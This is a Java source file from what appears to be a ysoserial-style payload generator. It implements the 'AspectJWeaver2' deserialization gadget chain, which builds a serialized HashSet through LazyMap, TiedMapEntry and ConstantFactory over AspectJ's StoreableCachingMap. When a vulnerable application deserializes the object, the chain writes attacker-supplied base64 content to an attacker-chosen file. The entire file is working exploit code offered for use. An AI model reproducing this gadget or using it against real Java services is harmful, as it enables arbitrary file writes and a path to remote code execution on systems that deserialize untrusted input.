package A.R.ysogate.payloads.gadgets;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.collections.Factory;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.utils.Reflections;

import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * 使用 ConstantFactory + FactoryTransformer 替换 ConstantTransformer，避免，类似本项目中的 CC10
 *
 * @author su18
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
public class AspectJWeaver2 implements ObjectPayload<Serializable> {

	@Override
	public Serializable getObject(String command) throws Exception {
		int sep = command.lastIndexOf(':');
		if (sep < 0) {
			throw new IllegalArgumentException("Command format is: <filename>:<base64 Object>");
		}
		String[] parts    = command.split(":");
		String   filename = parts[0];
		byte[]   content  = Base64.decodeBase64(parts[1]);

		Constructor ctor        = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
		Object      simpleCache = ctor.newInstance(".", 12);

		Factory     ft = new ConstantFactory(content);
		Transformer ct = new FactoryTransformer(ft);

		Map          lazyMap = LazyMap.decorate((Map) simpleCache, ct);
		TiedMapEntry entry   = new TiedMapEntry(lazyMap, filename);
		HashSet      map     = new HashSet(1);
		map.add("su18");
		Field f = null;
		try {
			f = HashSet.class.getDeclaredField("map");
		} catch (NoSuchFieldException e) {
			f = HashSet.class.getDeclaredField("backingMap");
		}

		Reflections.setAccessible(f);
		HashMap innimpl = (HashMap) f.get(map);

		Field f2 = null;
		try {
			f2 = HashMap.class.getDeclaredField("table");
		} catch (NoSuchFieldException e) {
			f2 = HashMap.class.getDeclaredField("elementData");
		}

		Reflections.setAccessible(f2);
		Object[] array = (Object[]) f2.get(innimpl);

		Object node = array[0];
		if (node == null) {
			node = array[1];
		}

		Field keyField = null;
		try {
			keyField = node.getClass().getDeclaredField("key");
		} catch (Exception e) {
			keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
		}

		Reflections.setAccessible(keyField);
		keyField.set(node, entry);

		return map;

	}
}
